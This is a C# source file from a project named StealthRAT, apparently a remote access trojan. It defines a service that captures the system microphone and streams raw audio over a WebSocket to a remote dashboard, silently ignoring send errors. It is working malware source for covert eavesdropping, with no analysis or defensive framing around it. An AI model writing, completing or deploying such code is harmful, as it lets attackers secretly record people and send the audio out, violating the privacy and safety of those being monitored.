using System;
using System.Net.WebSockets;
using System.Threading;
using System.Threading.Tasks;
using NAudio.Wave;
using StealthRAT.Interfaces;

namespace StealthRAT.Services
{
    /// <summary>
    /// Manages real-time audio capture from the system microphone and streams
    /// raw PCM audio data to the dashboard over WebSockets.
    /// </summary>
    public sealed class AudioCaptureService : IDisposable
    {
        private readonly ILoggerService _logger;
        private WaveInEvent? _captureDevice;
        private bool _isStreaming;
        private bool _disposed;

        /// <summary>
        /// Initializes a new instance of the <see cref="AudioCaptureService"/> class.
        /// </summary>
        /// <param name="logger">The logging service.</param>
        public AudioCaptureService(ILoggerService logger)
        {
            _logger = logger ?? throw new ArgumentNullException(nameof(logger));
        }

        /// <summary>
        /// Starts capturing from the microphone and sends binary audio packets over the WebSocket.
        /// </summary>
        public void StartStreaming(ClientWebSocket ws, Func<byte[], byte, CancellationToken, Task> sendBinaryAsync, CancellationToken token)
        {
            if (_isStreaming) return;
            _isStreaming = true;

            try
            {
                var waveFormat = new WaveFormat(16000, 16, 1); // 16kHz, 16-bit, Mono
                _captureDevice = new WaveInEvent { WaveFormat = waveFormat };

                _captureDevice.DataAvailable += (sender, e) =>
                {
                    if (!_isStreaming || ws.State != WebSocketState.Open) return;

                    byte[] pcmData = new byte[e.BytesRecorded];
                    Buffer.BlockCopy(e.Buffer, 0, pcmData, 0, e.BytesRecorded);

                    _ = Task.Run(async () =>
                    {
                        try
                        {
                            await sendBinaryAsync(pcmData, 0x02, token);
                        }
                        catch { }
                    });
                };

                _captureDevice.StartRecording();
                _logger.LogInfo("Microphone capture and stream started.");
            }
            catch (Exception ex)
            {
                _logger.LogError("Failed to start audio recording", ex);
                StopStreaming();
            }
        }

        /// <summary>
        /// Stops capturing audio.
        /// </summary>
        public void StopStreaming()
        {
            _isStreaming = false;
            try
            {
                if (_captureDevice != null)
                {
                    _captureDevice.StopRecording();
                    _captureDevice.Dispose();
                    _captureDevice = null;
                    _logger.LogInfo("Microphone capture and stream stopped.");
                }
            }
            catch (Exception ex)
            {
                _logger.LogError("Error stopping audio capture", ex);
            }
        }

        /// <summary>
        /// Releases all resources.
        /// </summary>
        public void Dispose()
        {
            if (!_disposed)
            {
                StopStreaming();
                _disposed = true;
            }
        }
    }
}
